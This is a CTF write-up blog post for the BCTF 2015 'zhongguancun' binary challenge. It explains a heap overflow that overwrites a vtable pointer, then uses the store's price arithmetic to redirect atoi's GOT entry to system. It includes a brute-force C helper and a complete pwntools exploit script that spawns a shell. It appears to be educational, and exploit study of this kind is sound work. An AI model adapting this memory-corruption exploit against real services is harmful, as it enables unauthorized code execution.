---
layout: post
title: "zhongguancun"
date: 2015-09-03 10:39:06 -0700
comments: true
categories: 
---
###0x00 analysis

https://github.com/ctfs/write-ups-2015/blob/master/bctf-2015/exploit/zhongguancun/zhongguancun-47a25f85cc5221071886cc129046e6e4.xz

item looks like this
	item
	{
	0	*vt;			
	4	char name[32];		
	36	char des[80];		
	116	int price;	
	120	int which_os;
	}
	

s  ------	2840 bytes  
storename 	46 + 63 bytes		--111  
item 		2+ 11 + 32 + 11(price) + 80 + 33 bytes	--171  
anyway, we can overflow 13bytes  
just, overflow next vtables to func sub_080492FE,we can write where we want  
first, change the value of money in .bss:0804B280 to the address of atoi in got.plt  
then, buy a thing,change the value of atoi in got.plt

	v2 = *(_DWORD *)money - *(_DWORD *)(a1 + 116) * v1;
	if ( v2 >= 0 )
	{
		*(_DWORD *)money = v2;
		print((int *)"Thanks for buying.\n");
		sprintf((char *)nptr, "Total money left: %d CNY.\n", *(_DWORD *)money);
		goto LABEL_13;
	}	
###0x01  


atoi 		2D4F0
		56432
system  	3B160

leak addr of atoi plus 56432 equal to 0xd160
sys 	d160

0x01 

I write a C program to calculate the number I should enter

	#include<stdio.h>
	#include<stdlib.h>
	int main()
	{
	      int i = 0x21f4f000;
	      int o = 0x22d16000;
	      int p = -2147483647;
	      int count;
	      for(;;p++)
		      for(count = 1;count>0;count++)
			      if(o == i - p*count)
				      printf("%d   %d\n", p, count);


	}

it works out like this

	root@jackpelf-VirtualBox:/tmp# ./a.out
	-2147483646   2140260352
	-2147483644   1070130176
	-2147483644   2143872000
	-2147483643   1715097600
	-2147483642   1429248000
	-2147483640   535065088

I chose the last one

###0x02 poc


	from pwn import *

	r = process("./zgc")
	f = open("input", "w")


	def sl(m):
		r.sendline(m)
		f.write(m + '\n')

	def rt(m):
		print r.readuntil(m)

	rt("choice?")
	sl("a")
	rt("store?")
	sl("S" *63)


	rt("choice?")
	sl("a")
	rt("name?")
	sl("A" * 31)
	rt("OS?")
	sl("4")
	rt("price?")
	sl("-2147483647")
	rt("description?")
	sl("B" * 79)

	rt("choice?")
	sl("c")


	atoi = 0x0804B037

	rt("choice?")
	sl("a")
	rt("name?")
	sl("a" * 31)
	rt("OS?")
	sl("4")
	rt("price?")
	sl("-2147483640")
	rt("description?")
	got = 0x0804B00C
	sl(p32(atoi) + "d"*75)



	for i in range(13):
		rt("choice?")
		sl("a")
		rt("name?")
		sl("A" * 31)
		rt("OS?")
		sl("4")
		rt("price?")
		sl("-2147483647")
		rt("description?")
		sl("B" * 79)

	rt("choice?")
	sl("a")
	rt("name?")
	sl("A" * 31)
	rt("OS?")
	sl("4")
	rt("price?")
	sl("-2147483647")
	rt("description?")
	sl("C"*(0x4e - 4) + p32(0x8049b74) )

	rt("choice?")
	sl("c")

	lg = 245


	rt("choice?")
	sl("d")
	rt("choice?")
	sl("b")
	rt("buy?")
	sl("2")
	rt("choice?")
	sl("b")
	rt("buy?")
	write_addr  = 0x0804B33C
	write_addr -= lg
	write_addr  = int(write_addr)
	sl(str(write_addr))

	rt("choice?")
	sl("a")
	rt("buy?")
	sl(str(535065088))

	rt("choice?")
	sl("a")
	rt("buy?")
	sl("sh")


	f.close()
	r.interactive()
